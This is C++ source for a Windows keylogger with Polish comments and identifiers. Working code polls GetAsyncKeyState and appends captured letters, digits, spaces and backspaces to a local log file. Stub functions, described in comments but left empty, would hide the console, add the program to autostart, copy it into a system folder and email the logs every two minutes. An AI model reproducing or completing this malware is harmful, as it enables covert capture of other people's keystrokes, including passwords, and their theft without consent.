#include <iostream>
#include <windows.h>
#include <stdio.h>

using namespace std;

void antyDuplikacja()
{
    //Zaimplementuj blokowanie podwojnego uruchomienia
}

void ukryjKonsole()
{
    //FreeConsole();
}

void dodajDoAutostartu()
{
    //Zaimplementuj dodawanie do autostartu
}

void kopiujDoSystemu()
{
    //Kopiowanie keylogger.exe do folderu gdzies w systemie
}

void wyslijMaila()
{
    //Zaimplementuj wyslij logi co 2 minuty
}

void zapiszLogi(int liczba)
{
    FILE * plik;
    plik = fopen("logi.txt", "a");
    if (plik!=NULL)
    {
        fputc((char)liczba, plik);
        fclose(plik);
    }
}

void wlaczKeyloggera()
{
    int liczba;
    int tymczasowa;

    while(true)
    {
        //ZCZYTUJE A-Z
        for(liczba=65; liczba<91; liczba++)
        {
            tymczasowa = GetAsyncKeyState(liczba);

            if (tymczasowa==-32767 && !GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)(liczba+32);
                zapiszLogi((liczba+32));
            }
            else if (tymczasowa==-32767 && GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)liczba;
                zapiszLogi(liczba);
            }

        }

        //ZCZYTUJE LICZBY
        for(liczba=48; liczba<58; liczba++)
        {
            if (GetAsyncKeyState(liczba)==-32767)
            {
                cout << (char)liczba;
                zapiszLogi(liczba);
            }
        }

        if (GetAsyncKeyState(VK_SPACE)==-32767)
        {
            cout << " ";
            zapiszLogi(32);
        }

        if (GetAsyncKeyState(VK_RETURN)==-32767)
        {
            cout << "[ENTER]";
        }

        if (GetAsyncKeyState(VK_BACK)==-32767)
        {
            cout << "[BS]";
            zapiszLogi(8);
        }

        if (GetAsyncKeyState(VK_DELETE)==-32767)
        {
            cout << "[DEL]";
        }

        if (GetAsyncKeyState(VK_TAB)==-32767)
        {
            cout << "[DEL]";
        }



    }
}

int main()
{
    ukryjKonsole();
    dodajDoAutostartu();
    kopiujDoSystemu();
    wlaczKeyloggera();
    return 0;
}
